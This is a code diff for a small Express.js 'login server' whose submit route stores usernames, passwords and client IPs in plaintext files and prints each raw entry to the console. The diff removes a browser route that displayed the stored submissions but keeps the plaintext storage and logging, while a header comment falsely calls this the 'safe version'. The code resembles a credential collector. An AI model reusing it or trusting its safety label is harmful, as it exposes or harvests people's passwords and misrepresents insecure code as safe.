@@ -1,3 +1,4 @@
+// server.js — plain text login server (safe version)
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -11,13 +12,14 @@ const OUTFILE = path.join(__dirname, 'submissions.jsonl');
 
 app.post('/submit', (req, res) => { 
   const { username, password } = req.body || {};
+  
   if (typeof username !== 'string' || typeof password !== 'string') {
     return res.status(400).json({ error: 'Missing username or password' });
   }
 
   const entry = { username, password, time: new Date().toISOString(), ip: req.ip };
 
-  // Debug file
+  // Debug file (for testing, optional)
   fs.appendFile('debug_submissions.txt', JSON.stringify(entry) + '\n', err => {
     if (err) console.error('Debug write error:', err);
   });
@@ -28,16 +30,11 @@ app.post('/submit', (req, res) => {
       console.error('Write error:', err);
       return res.status(500).json({ error: 'Could not save submission' });
     }
-   console.log('Saved submission (raw): ' + JSON.stringify(entry));
-    res.json({ success: true });
-  });
-});
 
-// Temporary route to view submissions in browser
-app.get('/view-submissions', (req, res) => {
-  fs.readFile('debug_submissions.txt', 'utf8', (err, data) => {
-    if(err) return res.send('No submissions yet.');
-    res.type('text').send(data.replace(/\n/g, '<br>'));
+    // Log full submission for testing
+    console.log('Saved submission (raw): ' + JSON.stringify(entry));
+    
+    res.json({ success: true });
   });
 });
 
